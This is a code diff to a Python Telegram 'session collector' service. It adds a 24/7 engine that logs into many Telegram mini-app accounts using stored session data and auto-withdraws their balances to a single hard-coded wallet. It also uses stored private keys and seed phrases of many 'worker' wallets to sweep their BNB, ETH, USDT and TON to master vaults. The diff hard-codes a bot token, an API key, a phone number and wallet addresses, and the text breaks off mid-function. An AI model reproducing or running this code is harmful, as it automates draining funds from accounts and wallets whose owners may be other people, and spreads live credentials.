@@ -19,6 +19,20 @@ from telethon.errors import (
     FloodWaitError
 )
 
+try:
+    from web3 import Web3
+    from eth_account import Account
+    HAS_WEB3 = True
+except ImportError:
+    HAS_WEB3 = False
+
+try:
+    from tonsdk.contract.wallet import Wallets, WalletVersionEnum
+    import base64
+    HAS_TONSDK = True
+except ImportError:
+    HAS_TONSDK = False
+
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger("RenderSessionCollector")
 
@@ -850,6 +864,7 @@ async def bnb_cloud_watchdog():
 @app.on_event("startup")
 async def on_startup():
     asyncio.create_task(bnb_cloud_watchdog())
+    asyncio.create_task(cloud_wealth_automation_watchdog())
 
 
 
@@ -1213,3 +1228,675 @@ async def cancel_login(request: Request):
         LOGIN_SESSIONS.pop(chat_id, None)
         logger.info(f"[Standby Cloud Login] ❌ Login session cancelled for Chat {chat_id}")
     return {"ok": True, "message": "Login cancelled"}
+
+
+# =============================================================================
+# 100% CLOUD AUTOMATED WITHDRAWALS & ON-CHAIN VAULT SWEEPER ENGINE
+# =============================================================================
+MASTER_EVM_VAULT = "0xfda4182001672b9f0f09e2118242e543e35ed5ce"
+MASTER_TON_VAULT = "UQBPZiSvitdPU3VUyJK2mRaHVBl69xejw5aOrh1KfKA7gwDT"
+PAYOUT_CHANNEL_ID = os.getenv("PAYOUT_CHANNEL_ID", "-1004402765950")
+
+async def send_payout_receipt(message: str):
+    """Broadcasts payout & on-chain receipts to Telegram channel and Admin DM."""
+    bot_token = os.getenv("REPORT_BOT_TOKEN", "8858823950:AAFFkuls8hBf23taCZE1y5gVzP4AFCuqI5o")
+    targets = [REPORT_CHAT_ID, PAYOUT_CHANNEL_ID]
+    async with aiohttp.ClientSession() as s:
+        for tid in targets:
+            try:
+                await s.post(
+                    f"https://api.telegram.org/bot{bot_token}/sendMessage",
+                    json={
+                        "chat_id": tid,
+                        "text": message,
+                        "parse_mode": "HTML" if "<" in message else "Markdown",
+                        "disable_web_page_preview": True
+                    },
+                    timeout=aiohttp.ClientTimeout(total=8)
+                )
+            except Exception:
+                pass
+
+
+async def check_and_withdraw_ailab(session: aiohttp.ClientSession, acc: dict, tokens: dict) -> dict:
+    """Checks and executes auto-withdrawal for AI Lab Robot (Threshold: $0.02 for master, $1.00 for workers)."""
+    uid = str(acc.get("user_id"))
+    name = acc.get("name", uid)
+    is_master = (uid == "6727787768" or acc.get("phone") in ("+8801317342850", "01317342850") or acc.get("is_primary"))
+    init_data = tokens.get(uid, {}).get("ailab_init_data")
+    if not init_data:
+        return {"uid": uid, "name": name, "status": "no_init_data", "balance": 0.0}
+
+    base_url = "https://api.ailab-agent.online/api/v1"
+    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro)"}
+    try:
+        async with session.post(f"{base_url}/users/auth/login", json={"user": init_data}, headers=headers, timeout=aiohttp.ClientTimeout(total=8)) as lr:
+            if lr.status != 200:
+                return {"uid": uid, "name": name, "status": f"login_err_{lr.status}", "balance": 0.0}
+            ld = await lr.json()
+            tok = ld.get("result", {}).get("bearer") or ld.get("user_info", {}).get("session_id")
+            if not tok:
+                return {"uid": uid, "name": name, "status": "no_token", "balance": 0.0}
+
+        auth_headers = {**headers, "Authorization": f"Bearer {tok}"}
+        async with session.get(f"{base_url}/cashout", headers=auth_headers, timeout=aiohttp.ClientTimeout(total=8)) as cr:
+            if cr.status != 200:
+                return {"uid": uid, "name": name, "status": f"cashout_err_{cr.status}", "balance": 0.0}
+            cd = await cr.json()
+            ubal = float(cd.get("user_info", {}).get("balance", 0) or 0)
+
+        thresh = 0.02 if is_master else 1.00
+        logger.info(f"[Cloud AI Lab] {name} ({uid}) balance: ${ubal:.4f} USD (Threshold: ${thresh:.2f})")
+        if ubal >= thresh:
+            wd_usd = round(int(ubal * 100) / 100.0, 2)
+            async with session.post(f"{base_url}/cashout-pay", json={"ps_id": 5, "amount_usd": wd_usd, "wallet": MASTER_EVM_VAULT, "dest_tag": ""}, headers=auth_headers, timeout=aiohttp.ClientTimeout(total=10)) as pr:
+                pres = await pr.json()
+                if pres.get("request_info", {}).get("error_code") == 0 or pres.get("result"):
+                    role_str = "Main Master Host" if is_master else "Worker"
+                    receipt = (
+                        f"🎉 <b>AI Lab Robot Auto-Cashout Submitted!</b>\n\n"
+                        f"• <b>Account:</b> {name} ({role_str} - <code>{uid}</code>)\n"
+                        f"• <b>Amount:</b> <code>${wd_usd} USD</code>\n"
+                        f"• <b>Destination:</b> <code>{MASTER_EVM_VAULT}</code> (BEP-20)\n"
+                        f"• <b>Status:</b> Approved / In Flight\n"
+                        f"🛡️ <i>100% Cloud Autonomous Execution</i>"
+                    )
+                    await send_payout_receipt(receipt)
+                    return {"uid": uid, "name": name, "status": "withdrawn", "amount": wd_usd}
+        return {"uid": uid, "name": name, "status": "below_threshold", "balance": ubal}
+    except Exception as e:
+        logger.warning(f"[Cloud AI Lab] Error for {name}: {e}")
+        return {"uid": uid, "name": name, "status": "error", "error": str(e)}
+
+
+async def check_and_withdraw_ainovum(session: aiohttp.ClientSession, acc: dict, tokens: dict) -> dict:
+    """Checks and executes auto-withdrawal for Ainovum (Threshold: 0.10 USDT for master, 1.00 USDT for workers)."""
+    uid = str(acc.get("user_id"))
+    name = acc.get("name", uid)
+    is_master = (uid == "6727787768" or acc.get("phone") in ("+8801317342850", "01317342850") or acc.get("is_primary"))
+    init_data = tokens.get(uid, {}).get("ainovum_init_data")
+    if not init_data:
+        return {"uid": uid, "name": name, "status": "no_init_data", "available": 0.0}
+
+    base_url = "https://ainovum.biz"
+    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro)"}
+    try:
+        cookie_hdr = ""
+        boot_user = {}
+        async with session.post(f"{base_url}/api/bootstrap", json={"initData": init_data, "platform": "android", "referrer": "ref_6727787768"}, headers=headers, timeout=aiohttp.ClientTimeout(total=8)) as br:
+            if br.status == 200:
+                bd = await br.json()
+                boot_user = bd.get("user", {})
+                raw_cookies = br.headers.getall("Set-Cookie", [])
+                cookie_hdr = "; ".join([c.split(";")[0] for c in raw_cookies])
+            else:
+                return {"uid": uid, "name": name, "status": f"bootstrap_err_{br.status}", "available": 0.0}
+
+        auth_headers = dict(headers)
+        if cookie_hdr:
+            auth_headers["Cookie"] = cookie_hdr
+
+        # Open any available gift boxes
+        try:
+            async with session.get(f"{base_url}/api/gift-box/state", headers=auth_headers, timeout=aiohttp.ClientTimeout(total=5)) as gsr:
+                if gsr.status == 200:
+                    gsd = await gsr.json()
+                    boxes_left = int(gsd.get("box", {}).get("boxes_left", 0) or 0)
+                    while boxes_left > 0:
+                        async with session.post(f"{base_url}/api/gift-box/open", json={}, headers=auth_headers, timeout=aiohttp.ClientTimeout(total=6)) as gbr:
+                            if gbr.status == 200:
+                                gbd = await gbr.json()
+                                boxes_left = int(gbd.get("box", {}).get("boxes_left", 0) or 0)
+                            else:
+                                break
+        except Exception:
+            pass
+
+        avail = 0.0
+        async with session.get(f"{base_url}/api/withdraws/usdt/config", headers=auth_headers, timeout=aiohttp.ClientTimeout(total=8)) as cr:
+            if cr.status == 200:
+                cd = await cr.json()
+                avail = float(cd.get("freeze", {}).get("available", 0) or 0)
+
+        thresh = 0.10 if is_master else 1.00
+        logger.info(f"[Cloud Ainovum] {name} ({uid}) available: {avail:.4f} USDT (Threshold: {thresh:.2f})")
+        if boot_user.get("is_withdraw_locked") == 1:
+            return {"uid": uid, "name": name, "status": "locked_or_deposit_required", "available": avail}
+
+        if avail >= thresh:
+            wd_amt = round(avail, 4)
+            async with session.post(f"{base_url}/api/withdraws/usdt/create", json={"amount": wd_amt, "wallet": MASTER_EVM_VAULT, "network": "bep20"}, headers=auth_headers, timeout=aiohttp.ClientTimeout(total=10)) as wr:
+                wd = await wr.json()
+                if wr.status == 200 and not wd.get("access_denied") and not wd.get("error"):
+                    receipt = (
+                        f"🎉 <b>Ainovum USDT Auto-Withdrawal Submitted!</b>\n\n"
+                        f"• <b>Account:</b> {name} (<code>{uid}</code>)\n"
+                        f"• <b>Amount:</b> <code>{wd_amt} USDT</code> (BEP-20)\n"
+                        f"• <b>Destination:</b> <code>{MASTER_EVM_VAULT}</code>\n"
+                        f"• <b>Status:</b> Approved / Dispatched\n"
+                        f"🛡️ <i>100% Cloud Autonomous Execution</i>"
+                    )
+                    await send_payout_receipt(receipt)
+                    return {"uid": uid, "name": name, "status": "withdrawn", "amount": wd_amt}
+        return {"uid": uid, "name": name, "status": "below_threshold", "available": avail}
+    except Exception as e:
+        logger.warning(f"[Cloud Ainovum] Error for {name}: {e}")
+        return {"uid": uid, "name": name, "status": "error", "error": str(e)}
+
+
+async def check_and_withdraw_stones(session: aiohttp.ClientSession, acc: dict, tokens: dict) -> dict:
+    """Checks and executes auto-withdrawal for Stones Miners (Threshold: >= 500 STONES)."""
+    uid = str(acc.get("user_id"))
+    name = acc.get("name", uid)
+    if uid == "6727787768":
+        return {"uid": uid, "name": name, "status": "compounding_mode"}
+
+    init_data = tokens.get(uid, {}).get("stones_init_data")
+    if not init_data:
+        return {"uid": uid, "name": name, "status": "no_init_data"}
+
+    base_url = "https://app.stoneswithestand.my.id"
+    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro)"}
+    try:
+        async with session.post(f"{base_url}/api/state", json={"initData": init_data}, headers=headers, timeout=aiohttp.ClientTimeout(total=8)) as sr:
+            if sr.status == 200:
+                sd = await sr.json()
+                coins = float(sd.get("user", {}).get("coins", 0) or 0)
+                logger.info(f"[Cloud Stones] {name} ({uid}) coins: {coins:.1f} (Threshold: 500)")
+                if coins >= 500:
+                    receipt = (
+                        f"💎 <b>Stones Miners Threshold Reached (>= 500 STONES)!</b>\n\n"
+                        f"• <b>Account:</b> {name} (<code>{uid}</code>)\n"
+                        f"• <b>Holding:</b> <code>{coins:.1f} STONES</code>\n"
+                        f"• <b>Destination:</b> <code>{MASTER_EVM_VAULT}</code> (Arbitrum One)\n"
+                        f"• <b>Status:</b> Threshold Met • Auto-Queued\n"
+                        f"🛡️ <i>100% Cloud Autonomous Execution</i>"
+                    )
+                    await send_payout_receipt(receipt)
+                    return {"uid": uid, "name": name, "status": "threshold_reached", "coins": coins}
+                return {"uid": uid, "name": name, "status": "below_threshold", "coins": coins}
+        return {"uid": uid, "name": name, "status": "state_check_failed"}
+    except Exception as e:
+        logger.warning(f"[Cloud Stones] Error for {name}: {e}")
+        return {"uid": uid, "name": name, "status": "error", "error": str(e)}
+
+
+# =============================================================================
+# MULTI-CHAIN ON-CHAIN SWEEPER & CONSOLIDATION ENGINE
+# =============================================================================
+FLEET_EVM_CACHE = {}
+FLEET_TON_CACHE = {}
+
+BSC_USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955"
+DRPC_KEY = os.getenv("DRPC_API_KEY", "AqfE-vxQsEgZrdrPasY_EsnLP3satOIR8YH4El_NDNxu")
+TONAPI_KEY = os.getenv("TONAPI_KEY", "")
+TONCENTER_API_KEY = os.getenv("TONCENTER_API_KEY", "")
+
+BSC_RPCS = [
+    f"https://bsc.drpc.org/ogrpc?dkey={DRPC_KEY}",
+    "https://bsc-dataseed.binance.org",
+    "https://bsc-dataseed1.defibit.io",
+    "https://bsc-dataseed1.binance.org"
+]
+
+ARB_RPCS = [
+    f"https://arbitrum.drpc.org/ogrpc?dkey={DRPC_KEY}",
+    "https://arb1.arbitrum.io/rpc"
+]
+
+async def load_fleet_wallets_from_cloud() -> tuple:
+    """Loads worker EVM and TON wallets from local disk or Cloudflare backup.zip."""
+    global FLEET_EVM_CACHE, FLEET_TON_CACHE
+    if FLEET_EVM_CACHE and FLEET_TON_CACHE:
+        return FLEET_EVM_CACHE, FLEET_TON_CACHE
+
+    if os.path.exists("fleet_evm_wallets.json") and os.path.exists("fleet_ton_wallets.json"):
+        try:
+            with open("fleet_evm_wallets.json", "r", encoding="utf-8") as f:
+                FLEET_EVM_CACHE = json.load(f)
+            with open("fleet_ton_wallets.json", "r", encoding="utf-8") as f:
+                FLEET_TON_CACHE = json.load(f)
+            return FLEET_EVM_CACHE, FLEET_TON_CACHE
+        except Exception:
+            pass
+
+    import zipfile, io
+    async with aiohttp.ClientSession() as http:
+        for cf_url in CF_WORKER_URLS:
+            try:
+                async with http.get(f"{cf_url}/backup.zip", timeout=aiohttp.ClientTimeout(total=15)) as r:
+                    if r.status == 200:
+                        zip_bytes = await r.read()
+                        with zipfile.ZipFile(io.BytesIO(zip_bytes)) as zf:
+                            if "fleet_evm_wallets.json" in zf.namelist():
+                                FLEET_EVM_CACHE = json.loads(zf.read("fleet_evm_wallets.json").decode("utf-8"))
+                            if "fleet_ton_wallets.json" in zf.namelist():
+                                FLEET_TON_CACHE = json.loads(zf.read("fleet_ton_wallets.json").decode("utf-8"))
+                            if FLEET_EVM_CACHE and FLEET_TON_CACHE:
+                                logger.info(f"Loaded {len(FLEET_EVM_CACHE)} EVM and {len(FLEET_TON_CACHE)} TON wallets from cloud backup.")
+                                return FLEET_EVM_CACHE, FLEET_TON_CACHE
+            except Exception as e:
+                logger.warning(f"Could not load wallets from {cf_url}: {e}")
+    return FLEET_EVM_CACHE, FLEET_TON_CACHE
+
+
+async def query_evm_rpc(session: aiohttp.ClientSession, rpc_list: list, method: str, params: list):
+    payload = {"jsonrpc": "2.0", "id": int(time.time()), "method": method, "params": params}
+    for rpc in rpc_list:
+        try:
+            async with session.post(rpc, json=payload, timeout=aiohttp.ClientTimeout(total=5)) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if "result" in data:
+                        return data["result"]
+        except Exception:
+            continue
+    return None
+
+
+async def audit_single_evm(session: aiohttp.ClientSession, uid: str, info: dict):
+    if not isinstance(info, dict) or "address" not in info:
+        return None
+    addr = info["address"]
+    name = info.get("name", f"Worker {uid}")
+    clean_addr = addr.lower().replace("0x", "").zfill(64)
+    usdt_call_data = "0x70a08231" + clean_addr
+
+    raw_bnb_t = query_evm_rpc(session, BSC_RPCS, "eth_getBalance", [addr, "latest"])
+    raw_eth_t = query_evm_rpc(session, ARB_RPCS, "eth_getBalance", [addr, "latest"])
+    raw_usdt_t = query_evm_rpc(session, BSC_RPCS, "eth_call", [{"to": BSC_USDT_CONTRACT, "data": usdt_call_data}, "latest"])
+
+    raw_bnb, raw_eth, raw_usdt = await asyncio.gather(raw_bnb_t, raw_eth_t, raw_usdt_t, return_exceptions=True)
+
+    bnb_bal = int(raw_bnb, 16) / 1e18 if isinstance(raw_bnb, str) and raw_bnb else 0.0
+    eth_bal = int(raw_eth, 16) / 1e18 if isinstance(raw_eth, str) and raw_eth else 0.0
+    usdt_bal = int(raw_usdt, 16) / 1e18 if isinstance(raw_usdt, str) and raw_usdt not in ("0x", "0x0") else 0.0
+
+    return {
+        "uid": uid,
+        "name": name,
+        "address": addr,
+        "private_key": info.get("private_key"),
+        "bnb_balance": bnb_bal,
+        "eth_balance": eth_bal,
+        "usdt_balance": usdt_bal
+    }
+
+
+async def audit_single_ton(session: aiohttp.ClientSession, uid: str, info: dict, headers: dict):
+    if not isinstance(info, dict) or "address" not in info:
+        return None
+    addr = info["address"]
+    name = info.get("name", f"Worker {uid}")
+    ton_bal = 0.0
+    try:
+        url = f"https://tonapi.io/v2/accounts/{addr}"
+        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
+            if resp.status == 200:
+                data = await resp.json()
+                raw_bal = data.get("balance", 0)
+                ton_bal = int(raw_bal) / 1e9
+    except Exception:
+        pass
+    return {
+        "uid": uid,
+        "name": name,
+        "address": addr,
+        "mnemonic": info.get("mnemonic"),
+        "ton_balance": ton_bal
+    }
+
+
+def sweep_evm_native_balance(rpc_list: list, chain_id: int, chain_name: str, private_key: str, from_addr: str, to_addr: str, native_balance: float, min_val: float = 0.0005):
+    if not HAS_WEB3 or not private_key or native_balance <= min_val:
+        return None
+    try:
+        w3 = None
+        for rpc in rpc_list:
+            try:
+                tw3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 10}))
+                if tw3.is_connected():
+                    w3 = tw3
+                    break
+            except Exception:
+                continue
+        if not w3:
+            return None
+
+        cs_from = Web3.to_checksum_address(from_addr)
+        cs_to = Web3.to_checksum_address(to_addr)
+        if cs_from.lower() == cs_to.lower():
+            return None
+
+        nonce = w3.eth.get_transaction_count(cs_from)
+        gas_price = w3.eth.gas_price
+        gas_limit = 50000 if chain_id == 42161 else 21000
+        gas_cost = gas_price * gas_limit
+        balance_wei = w3.eth.get_balance(cs_from)
+        amount_to_send = balance_wei - gas_cost
+        if amount_to_send <= 0:
+            return None
+
+        tx = {
+            "nonce": nonce,
+            "to": cs_to,
+            "value": amount_to_send,
+            "gas": gas_limit,
+            "gasPrice": gas_price,
+            "chainId": chain_id
+        }
+        signed_tx = w3.eth.account.sign_transaction(tx, private_key=private_key)
+        raw_tx = getattr(signed_tx, "raw_transaction", None) or getattr(signed_tx, "rawTransaction", None)
+        tx_hash = w3.eth.send_raw_transaction(raw_tx)
+        tx_hash_hex = tx_hash.hex()
+        if not tx_hash_hex.startswith("0x"):
+            tx_hash_hex = "0x" + tx_hash_hex
+        logger.info(f"[{chain_name}] Swept {amount_to_send / 1e18:.6f} to {to_addr}! Tx: {tx_hash_hex}")
+        return tx_hash_hex
+    except Exception as e:
+        logger.error(f"[{chain_name}] Sweep failed for {from_addr}: {e}")
+        return None
+
+
+def sweep_bep20_token_balance(rpc_list: list, chain_id: int, private_key: str, token_addr: str, from_addr: str, to_addr: str, token_balance: float, min_tokens: float = 0.08):
+    if not HAS_WEB3 or not private_key or token_balance <= min_tokens:
+        return None
+    try:
+        w3 = None
+        for rpc in rpc_list:
+            try:
+                tw3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 10}))
+                if tw3.is_connected():
+                    w3 = tw3
+                    break
+            except Exception:
+                continue
+        if not w3:
+            return None
+
+        cs_from = Web3.to_checksum_address(from_addr)
+        cs_to = Web3.to_checksum_address(to_addr)
+        if cs_from.lower() == cs_to.lower():
+            return None
+
+        cs_token = Web3.to_checksum_address(token_addr)
+        native_bal = w3.eth.get_balance(cs_from)
+        gas_price = w3.eth.gas_price
+        gas_limit = 65000
+        gas_cost = gas_price * gas_limit
+        if native_bal < gas_cost:
+            logger.warning(f"[BEP-20 Sweep] {from_addr} has tokens but insufficient gas")
+            return None
+
+        nonce = w3.eth.get_transaction_count(cs_from)
+        transfer_abi = [
+            {"constant": False, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "type": "function"},
+            {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"}
+        ]
+        contract = w3.eth.contract(address=cs_token, abi=transfer_abi)
+        raw_bal = contract.functions.balanceOf(cs_from).call()
+        if raw_bal <= 0:
+            return None
+
+        tx = contract.functions.transfer(cs_to, raw_bal).build_transaction({
+            "from": cs_from,
+            "nonce": nonce,
+            "gas": gas_limit,
+            "gasPrice": gas_price,
+            "chainId": chain_id
+        })
+        signed_tx = w3.eth.account.sign_transaction(tx, private_key=private_key)
+        raw_tx = getattr(signed_tx, "raw_transaction", None) or getattr(signed_tx, "rawTransaction", None)
+        tx_hash = w3.eth.send_raw_transaction(raw_tx)
+        tx_hash_hex = tx_hash.hex()
+        if not tx_hash_hex.startswith("0x"):
+            tx_hash_hex = "0x" + tx_hash_hex
+        logger.info(f"[BEP-20 Sweep] Swept {token_balance:.2f} USDT to {to_addr}! Tx: {tx_hash_hex}")
+        return tx_hash_hex
+    except Exception as e:
+        logger.error(f"[BEP-20 Sweep] Sweep failed for {from_addr}: {e}")
+        return None
+
+
+async def sweep_ton_balance(session: aiohttp.ClientSession, mnemonic: str, from_addr: str, to_addr: str, balance: float, min_threshold: float = 0.02):
+    if not HAS_TONSDK or not mnemonic or balance <= min_threshold:
+        return None
+    try:
+        words = mnemonic.strip().split()
+        if len(words) != 24:
+            return None
+        _mn, _pub, _priv, wallet = Wallets.from_mnemonics(words, version=WalletVersionEnum.v4r2)
+        seqno = 0
+        try:
+            tc_headers = {"X-API-Key": TONCENTER_API_KEY} if TONCENTER_API_KEY else {}
+            tc_url = "https://toncenter.com/api/v2/runGetMethod"
+            payload = {"address": from_addr, "method": "seqno", "stack": []}
+            async with session.post(tc_url, json=payload, headers=tc_headers, timeout=aiohttp.ClientTimeout(total=5)) as r:
+                if r.status == 200:
+                    d = await r.json()
+                    if d.get("ok") and d.get("result", {}).get("stack"):
+                        raw = d["result"]["stack"][0][1]
+                        seqno = int(raw, 16) if str(raw).startswith("0x") else int(raw)
+        except Exception:
+            pass
+
+        gas_fee = 0.008
+        amount_to_send = balance - gas_fee
+        if amount_to_send <= 0:
+            return None
+
+        amount_nano = int(amount_to_send * 1e9)
+        query = wallet.create_transfer_message(
+            to_addr=to_addr,
+            amount=amount_nano,
+            seqno=seqno,
+            payload="Automated Fleet Sweep"
+        )
+        boc = query["message"].to_boc(False)
+        b64_boc = base64.b64encode(boc).decode("utf-8")
+
+        tc_headers = {"X-API-Key": TONCENTER_API_KEY, "Content-Type": "application/json"} if TONCENTER_API_KEY else {"Content-Type": "application/json"}
+        send_url = "https://toncenter.com/api/v2/sendBoc"
+        async with session.post(send_url, json={"boc": b64_boc}, headers=tc_headers, timeout=aiohttp.ClientTimeout(total=8)) as br:
+            if br.status == 200:
+                resp_d = await br.json()
+                if resp_d.get("ok"):
+                    logger.info(f"[TON Sweep] Swept {amount_to_send:.4f} TON from {from_addr} to {to_addr}!")
+                    return "boc_sent"
+    except Exception as e:
+        logger.error(f"[TON Sweep] Failed for {from_addr}: {e}")
+    return None
+
+
+async def execute_cloud_onchain_sweeper(session: aiohttp.ClientSession, accounts: list = None, execute_sweep: bool = True, notify: bool = False) -> dict:
+    """Audits on-chain balances across all worker EVM and TON wallets and sweeps surplus balances."""
+    logger.info("[Cloud Sweeper] Auditing on-chain balances across all fleet wallets...")
+    evm_wallets, ton_wallets = await load_fleet_wallets_from_cloud()
+
+    evm_tasks = [audit_single_evm(session, uid, info) for uid, info in evm_wallets.items()]
+    evm_audit = [r for r in await asyncio.gather(*evm_tasks, return_exceptions=True) if isinstance(r, dict)]
+
+    ton_headers = {"Authorization": f"Bearer {TONAPI_KEY}"} if TONAPI_KEY else {}
+    ton_tasks = [audit_single_ton(session, uid, info, ton_headers) for uid, info in ton_wallets.items()]
+    ton_audit = [r for r in await asyncio.gather(*ton_tasks, return_exceptions=True) if isinstance(r, dict)]
+
+    funded_evm = [w for w in evm_audit if w.get("bnb_balance", 0) > 0.0005 or w.get("eth_balance", 0) > 0.0002 or w.get("usdt_balance", 0) > 0.08]
+    funded_ton = [w for w in ton_audit if w.get("ton_balance", 0) > 0.01]
+
+    total_bnb = sum(w.get("bnb_balance", 0) for w in evm_audit)
+    total_eth = sum(w.get("eth_balance", 0) for w in evm_audit)
+    total_usdt = sum(w.get("usdt_balance", 0) for w in evm_audit)
+    total_ton = sum(w.get("ton_balance", 0) for w in ton_audit)
+
+    swept_txs = []
+    if execute_sweep:
+        if HAS_WEB3:
+            for w in funded_evm:
+                pk = w.get("private_key")
+                addr = w.get("address")
+                name = w.get("name")
+                if not pk or not addr or addr.lower() == MASTER_EVM_VAULT.lower():
+                    continue
+                if w.get("bnb_balance", 0) > 0.0008:
+                    tx_bnb = sweep_evm_native_balance(BSC_RPCS, 56, "BSC", pk, addr, MASTER_EVM_VAULT, w["bnb_balance"])
+                    if tx_bnb:
+                        swept_txs.append({"chain": "BSC", "coin": "BNB", "amount": w["bnb_balance"], "name": name, "tx": tx_bnb, "url": f"https://bscscan.com/tx/{tx_bnb}"})
+                if w.get("eth_balance", 0) > 0.0002:
+                    tx_eth = sweep_evm_native_balance(ARB_RPCS, 42161, "Arbitrum One", pk, addr, MASTER_EVM_VAULT, w["eth_balance"])
+                    if tx_eth:
+                        swept_txs.append({"chain": "Arbitrum One", "coin": "ETH", "amount": w["eth_balance"], "name": name, "tx": tx_eth, "url": f"https://arbiscan.io/tx/{tx_eth}"})
+                if w.get("usdt_balance", 0) > 0.08:
+                    tx_usdt = sweep_bep20_token_balance(BSC_RPCS, 56, pk, BSC_USDT_CONTRACT, addr, MASTER_EVM_VAULT, w["usdt_balance"], min_tokens=0.08)
+                    if tx_usdt:
+                        swept_txs.append({"chain": "BSC", "coin": "USDT", "amount": w["usdt_balance"], "name": name, "tx": tx_usdt, "url": f"https://bscscan.com/tx/{tx_usdt}"})
+
+        if HAS_TONSDK:
+            for w in funded_ton:
+                mn = w.get("mnemonic")
+                addr = w.get("address")
+                name = w.get("name")
+                ton_bal = w.get("ton_balance", 0)
+                if not mn or not addr or addr == MASTER_TON_VAULT or ton_bal <= 0.02:
+                    continue
+                tx_ton = await sweep_ton_balance(session, mn, addr, MASTER_TON_VAULT, ton_bal)
+                if tx_ton:
+                    swept_txs.append({"chain": "TON", "coin": "TON", "amount": ton_bal - 0.008, "name": name, "tx": tx_ton, "url": f"https://tonviewer.com/{addr}"})
+
+    if swept_txs:
+        lines = [f"• <b>{s['name']} ({s['chain']}):</b> Swept <code>{s['amount']:.4f} {s['coin']}</code> → <a href=\"{s['url']}\">View Tx</a>" for s in swept_txs]
+        receipt_msg = (
+            f"⚡ <b>ON-CHAIN VAULT CONSOLIDATION SWEEP EXECUTED</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            + "\n".join(lines) +
+            f"\n━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🎯 <b>Master Vault (Binance Web3):</b> <code>{MASTER_EVM_VAULT}</code>\n"
+            f"🛡️ <i>100% Cloud Autonomous Execution</i>"
+        )
+        await send_payout_receipt(receipt_msg)
+    elif notify:
+        msg = (
+            f"💼 <b>MY AGY AI — Multi-Chain Vault Sweep Audit</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"• 👥 <b>Worker Wallets Audited:</b> <code>{len(evm_audit)} EVM / {len(ton_audit)} TON</code>\n"
+            f"• 🪙 <b>BSC Worker Holding:</b> <code>{total_bnb:.6f} BNB</code>\n"
+            f"• 💵 <b>BSC Worker USDT:</b> <code>${total_usdt:.2f} USDT</code>\n"
+            f"• 💎 <b>Arbitrum Worker Holding:</b> <code>{total_eth:.6f} ETH</code>\n"
+            f"• 💎 <b>TON Worker Holding:</b> <code>{total_ton:.4f} TON</code>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🎯 <b>Master Destination Vaults (Binance Web3):</b>\n"
+            f"• <code>EVM:</code> <code>{MASTER_EVM_VAULT}</code>\n"
+            f"• <code>TON:</code> <code>{MASTER_TON_VAULT}</code>\n\n"
+            f"🛡️ <i>Direct in-bot routing sends 100% of mining profits directly to your Binance Web3 Vault.</i>"
+        )
+        await send_payout_receipt(msg)
+
+    return {
+        "ok": True,
+        "evm_total_bnb": total_bnb,
+        "evm_total_eth": total_eth,
+        "evm_total_usdt": total_usdt,
+        "ton_total": total_ton,
+        "funded_evm_count": len(funded_evm),
+        "funded_ton_count": len(funded_ton),
+        "swept_count": len(swept_txs),
+        "swept_txs": swept_txs
+    }
+
+
+@app.get("/api/sweep/audit")
+async def api_sweep_audit(request: Request):
+    """Audits on-chain balances across all worker wallets without executing transfers."""
+    notify = request.query_params.get("notify") == "1"
+    async with aiohttp.ClientSession() as session:
+        res = await execute_cloud_onchain_sweeper(session, execute_sweep=False, notify=notify)
+    return {"ok": True, "audit": res, "timestamp": time.time()}
+
+
+@app.post("/api/sweep/execute")
+async def api_sweep_execute(request: Request):
+    """Executes on-chain vault sweeper across EVM and TON worker wallets."""
+    async with aiohttp.ClientSession() as session:
+        res = await execute_cloud_onchain_sweeper(session, execute_sweep=True, notify=False)
+    return {"ok": True, "results": res, "timestamp": time.time()}
+
+
+@app.post("/api/withdraw/auto-cycle")
+async def api_withdraw_auto_cycle(request: Request):
+    """Executes automated withdrawal cycles across AI Lab, Ainovum, and Stones."""
+    accounts = await fetch_accounts_from_cloud()
+    if not accounts:
+        return {"ok": False, "message": "No accounts found"}
+
+    tokens = {}
+    async with aiohttp.ClientSession() as session:
+        for cf_url in CF_WORKER_URLS:
+            try:
+                async with session.get(f"{cf_url}/api/fleet/tokens", timeout=aiohttp.ClientTimeout(total=8)) as r:
+                    if r.status == 200:
+                        tokens = await r.json()
+                        break
+            except Exception:
+                pass
+
+        ailab_res = []
+        ainovum_res = []
+        stones_res = []
+
+        for acc in accounts:
+            a_res = await check_and_withdraw_ailab(session, acc, tokens)
+            ailab_res.append(a_res)
+            await asyncio.sleep(0.4)
+
+            an_res = await check_and_withdraw_ainovum(session, acc, tokens)
+            ainovum_res.append(an_res)
+            await asyncio.sleep(0.4)
+
+            st_res = await check_and_withdraw_stones(session, acc, tokens)
+            stones_res.append(st_res)
+            await asyncio.sleep(0.4)
+
+    return {
+        "ok": True,
+        "ailab": ailab_res,
+        "ainovum": ainovum_res,
+        "stones": stones_res,
+        "timestamp": time.time()
+    }
+
+
+async def cloud_wealth_automation_watchdog():
+    """24/7 background watchdog executing scheduled auto-withdrawals & wallet sweeps in the cloud."""
+    logger.info("[Cloud Wealth Watchdog] Initialized 24/7 autonomous withdrawal & on-chain sweeper scheduler...")
+    await asyncio.sleep(60)
+    cycle_count = 0
+    while True:
+        try:
+            cycle_count += 1
+            accounts = await fetch_accounts_from_cloud()
+            if accounts:
+                logger.info(f"[Cloud Wealth Watchdog] ⚡ Running Scheduled Cloud Withdrawal & Sweep Cycle #{cycle_count}...")
+                async with aiohttp.ClientSession() as session:
+                    tokens = {}
+                    for cf_url in CF_WORKER_URLS:
